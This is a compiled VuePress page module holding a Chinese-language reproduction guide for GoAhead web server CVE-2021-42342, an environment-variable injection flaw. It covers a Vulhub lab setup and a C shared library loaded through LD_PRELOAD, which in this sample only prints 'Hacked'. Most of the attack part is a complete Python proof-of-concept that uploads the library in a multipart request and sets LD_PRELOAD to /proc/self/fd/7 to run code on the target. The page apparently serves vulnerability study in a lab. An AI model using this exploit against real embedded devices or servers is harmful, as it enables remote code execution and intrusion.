import{_ as p}from"./plugin-vue_export-helper-c27b6911.js";import{r as o,o as c,c as i,a as n,b as s,d as t,e}from"./app-58e4a7d6.js";const l={},u=n("h2",{id:"漏洞描述",tabindex:"-1"},[n("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),r=n("p",null,"GoAhead是一个开源(商业许可)、简单、轻巧、功能强大、可以在多个平台运行的Web Server，多用于嵌入式系统、智能设备。其支持运行ASP、Javascript和标准的CGI程序。",-1),d={href:"https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562",target:"_blank",rel:"noopener noreferrer"},k=n("code",null,"LD_PRELOAD",-1),v=n("p",null,"参考链接：",-1),m={href:"https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562",target:"_blank",rel:"noopener noreferrer"},b={href:"https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/",target:"_blank",rel:"noopener noreferrer"},h={href:"https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg",target:"_blank",rel:"noopener noreferrer"},g=e(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub执行如下命令启动GoAhead 5.1.4：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>启动完成后，访问<code>http://your-ip:8080/</code>即可看到欢迎页面。访问<code>http://your-ip:8080/cgi-bin/index</code>即可查看到Hello页面，即为CGI执行的结果。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>首先需要编译一个动态链接库，而且需要和目标架构相同。所以在实战中，如果对方是一个智能设备，你可能需要交叉编译。因为Vulhub运行在<code>Linux x86_64</code>的机器中，所以我们直接用Linux PC编译即可。动态链接库源码：</p><div class="language-c line-numbers-mode" data-ext="c"><pre class="language-c"><code><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">before_main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token keyword">__attribute__</span><span class="token punctuation">(</span><span class="token punctuation">(</span>constructor<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">before_main</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">&quot;Hello: World\\r\\n\\r\\n&quot;</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">&quot;Hacked\\n&quot;</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这样，<code>before_main</code>函数将在程序执行前被调用。编译以上代码：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>gcc -s -shared -fPIC ./payload.c -o payload.so
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,9),_={href:"https://github.com/vulhub/vulhub/blob/master/goahead/CVE-2021-42342/poc.py",target:"_blank",rel:"noopener noreferrer"},y=e(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python poc.py http://target-ip:8080/cgi-bin/index /path/to/payload.so
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>可见，我们在动态链接库中编写的劫持代码已经被成功执行：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202207061401980.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞poc" tabindex="-1"><a class="header-anchor" href="#漏洞poc" aria-hidden="true">#</a> 漏洞POC</h2><div class="language-python line-numbers-mode" data-ext="py"><pre class="language-python"><code><span class="token keyword">import</span> sys
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> ssl
<span class="token keyword">import</span> random
<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparse<span class="token punctuation">,</span> ParseResult

PAYLOAD_MAX_LENGTH <span class="token operator">=</span> <span class="token number">16384</span> <span class="token operator">-</span> <span class="token number">200</span>


<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span>client<span class="token punctuation">,</span> parts<span class="token punctuation">:</span> ParseResult<span class="token punctuation">,</span> payload<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    path <span class="token operator">=</span> <span class="token string">&#39;/&#39;</span> <span class="token keyword">if</span> <span class="token keyword">not</span> parts<span class="token punctuation">.</span>path <span class="token keyword">else</span> parts<span class="token punctuation">.</span>path
    boundary <span class="token operator">=</span> <span class="token string">&#39;----%s&#39;</span> <span class="token operator">%</span> <span class="token builtin">str</span><span class="token punctuation">(</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1000000000000</span><span class="token punctuation">,</span> <span class="token number">9999999999999</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    padding <span class="token operator">=</span> <span class="token string">&#39;a&#39;</span> <span class="token operator">*</span> <span class="token number">2000</span>
    content_length <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">500</span><span class="token punctuation">,</span> PAYLOAD_MAX_LENGTH<span class="token punctuation">)</span>
    data <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">fr&#39;&#39;&#39;POST </span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string"> HTTP/1.1
Host: </span><span class="token interpolation"><span class="token punctuation">{</span>parts<span class="token punctuation">.</span>hostname<span class="token punctuation">}</span></span><span class="token string">
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=</span><span class="token interpolation"><span class="token punctuation">{</span>boundary<span class="token punctuation">}</span></span><span class="token string">
Content-Length: </span><span class="token interpolation"><span class="token punctuation">{</span>content_length<span class="token punctuation">}</span></span><span class="token string">

--</span><span class="token interpolation"><span class="token punctuation">{</span>boundary<span class="token punctuation">}</span></span><span class="token string">
Content-Disposition: form-data; name=&quot;LD_PRELOAD&quot;;

/proc/self/fd/7
--</span><span class="token interpolation"><span class="token punctuation">{</span>boundary<span class="token punctuation">}</span></span><span class="token string">
Content-Disposition: form-data; name=&quot;data&quot;; filename=&quot;1.txt&quot;
Content-Type: text/plain

#payload#</span><span class="token interpolation"><span class="token punctuation">{</span>padding<span class="token punctuation">}</span></span><span class="token string">
--</span><span class="token interpolation"><span class="token punctuation">{</span>boundary<span class="token punctuation">}</span></span><span class="token string">--
&#39;&#39;&#39;</span></span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">&#39;\\n&#39;</span><span class="token punctuation">,</span> <span class="token string">&#39;\\r\\n&#39;</span><span class="token punctuation">)</span>
    data <span class="token operator">=</span> data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">b&#39;#payload#&#39;</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
    client<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
    resp <span class="token operator">=</span> client<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">20480</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>resp<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    target <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    payload_filename <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>

    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>payload_filename<span class="token punctuation">,</span> <span class="token string">&#39;rb&#39;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
        data <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&gt;</span> PAYLOAD_MAX_LENGTH<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">&#39;payload size must not larger than %d&#39;</span><span class="token punctuation">,</span> PAYLOAD_MAX_LENGTH<span class="token punctuation">)</span>

    parts <span class="token operator">=</span> urlparse<span class="token punctuation">(</span>target<span class="token punctuation">)</span>
    port <span class="token operator">=</span> parts<span class="token punctuation">.</span>port
    <span class="token keyword">if</span> <span class="token keyword">not</span> parts<span class="token punctuation">.</span>port<span class="token punctuation">:</span>
        <span class="token keyword">if</span> parts<span class="token punctuation">.</span>scheme <span class="token operator">==</span> <span class="token string">&#39;https&#39;</span><span class="token punctuation">:</span>
            port <span class="token operator">=</span> <span class="token number">443</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            port <span class="token operator">=</span> <span class="token number">80</span>

    context <span class="token operator">=</span> ssl<span class="token punctuation">.</span>create_default_context<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> socket<span class="token punctuation">.</span>create_connection<span class="token punctuation">(</span><span class="token punctuation">(</span>parts<span class="token punctuation">.</span>hostname<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token keyword">as</span> client<span class="token punctuation">:</span>
        <span class="token keyword">if</span> parts<span class="token punctuation">.</span>scheme <span class="token operator">==</span> <span class="token string">&#39;https&#39;</span><span class="token punctuation">:</span>
            <span class="token keyword">with</span> context<span class="token punctuation">.</span>wrap_socket<span class="token punctuation">(</span>client<span class="token punctuation">,</span> server_hostname<span class="token operator">=</span>parts<span class="token punctuation">.</span>hostname<span class="token punctuation">)</span> <span class="token keyword">as</span> ssock<span class="token punctuation">:</span>
                exploit<span class="token punctuation">(</span>ssock<span class="token punctuation">,</span> parts<span class="token punctuation">,</span> data<span class="token punctuation">)</span>

        <span class="token keyword">else</span><span class="token punctuation">:</span>
            exploit<span class="token punctuation">(</span>client<span class="token punctuation">,</span> parts<span class="token punctuation">,</span> data<span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">&#39;__main__&#39;</span><span class="token punctuation">:</span>
    main<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,5);function f(w,x){const a=o("ExternalLinkIcon");return c(),i("div",null,[u,r,n("p",null,[s("这个漏洞是"),n("a",d,[s("CVE-2017-17562"),t(a)]),s("漏洞补丁的绕过，攻击者可以利用该补丁没有考虑到的multipart表单控制目标服务器的环境变量，进而劫持"),k,s("来执行任意代码。")]),v,n("ul",null,[n("li",null,[n("a",m,[s("https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562"),t(a)])]),n("li",null,[n("a",b,[s("https://ahmed-belkahla.me/post/2-methods-rce-0-day-in-goahead-webserver-pbctf-2021/"),t(a)])]),n("li",null,[n("a",h,[s("https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg"),t(a)])])]),g,n("p",null,[s("然后，我们使用"),n("a",_,[s("这个脚本"),t(a)]),s("来发送恶意数据包，复现漏洞：")]),y])}const C=p(l,[["render",f],["__file","GoAhead Server 环境变量注入 CVE-2021-42342.html.vue"]]);export{C as default};
